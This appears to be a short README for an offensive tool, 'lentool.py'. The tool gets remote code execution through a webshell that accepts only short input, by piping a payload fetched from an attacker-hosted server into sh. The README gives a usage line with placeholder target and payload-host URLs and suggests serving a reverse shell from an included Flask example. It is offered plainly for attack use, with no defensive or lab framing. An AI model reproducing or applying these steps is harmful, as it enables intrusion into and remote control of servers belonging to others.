# Description
Tool to RCE in limited length input length webshell.  
It pipes the paylaod to sh, you can customize it with a few changes in the source code (python one is already done just uncoment it), also you could modify it to execute commands directly.

# Usage:
```
python3 lentool.py -t http://targetexample.com/?start -u http://myserverexample.com
--target, -t: Target URL with param.  
--url, -u: Web server hosting the payload.
```
In the extras folder you can find an example using flask to host the payload, for example you could use a reverse shell.
